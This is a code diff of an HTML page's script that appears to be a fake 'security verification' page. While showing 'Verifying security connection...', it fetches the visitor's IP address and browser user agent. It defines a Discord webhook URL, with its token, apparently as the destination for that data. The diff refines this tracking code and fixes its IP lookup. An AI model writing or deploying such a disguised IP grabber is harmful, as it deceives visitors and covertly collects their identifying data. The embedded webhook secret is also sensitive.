@@ -7,8 +7,8 @@
 
   <link rel="preconnect" href="https://googleapis.com">
   <link rel="preconnect" href="https://gstatic.com" crossorigin>
-  <link href="https://googleapis.com" rel="stylesheet">
-  <link rel="stylesheet" href="https://cloudflare.com">
+  <link href="https://googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
   <style>
     body {
@@ -172,10 +172,10 @@
   </div>
 
   <script>
-const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
-const discordInvite = "https://discord.gg/fMbZNhGVmh";
+    const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+    const discordInvite = "https://discord.gg/fMbZNhGVmh";
     
-    let globalUserIp = null;
+    let globalUserIp = "Unknown/Blocked";
     let ipFetchPromise = null;
 
     function playSuccessSound() {
@@ -208,7 +208,7 @@ const discordInvite = "https://discord.gg/fMbZNhGVmh";
             return;
         }
 
-        ipFetchPromise = fetch("https://ipify.org")
+        ipFetchPromise = fetch("https://api.ipify.org?format=json")
             .then(res => res.json())
             .then(data => {
                 globalUserIp = data.ip;
@@ -220,7 +220,7 @@ const discordInvite = "https://discord.gg/fMbZNhGVmh";
                         globalUserIp = data.ip;
                     })
                     .catch(() => {
-                        globalUserIp = "Blocked/Failed";
+                        globalUserIp = "Unknown/Blocked";
                     });
             });
     }
@@ -239,12 +239,8 @@ const discordInvite = "https://discord.gg/fMbZNhGVmh";
         document.getElementById('loader').style.display = 'block';
         document.getElementById('status-label').innerText = "Verifying security connection...";
 
-        if (!globalUserIp && ipFetchPromise) {
+        if (globalUserIp === "Unknown/Blocked" && ipFetchPromise) {
             await ipFetchPromise;
-        }
-
-        if (!globalUserIp) {
-            globalUserIp = "Unknown/Blocked";
         }
 
         const userAgent = navigator.userAgent;
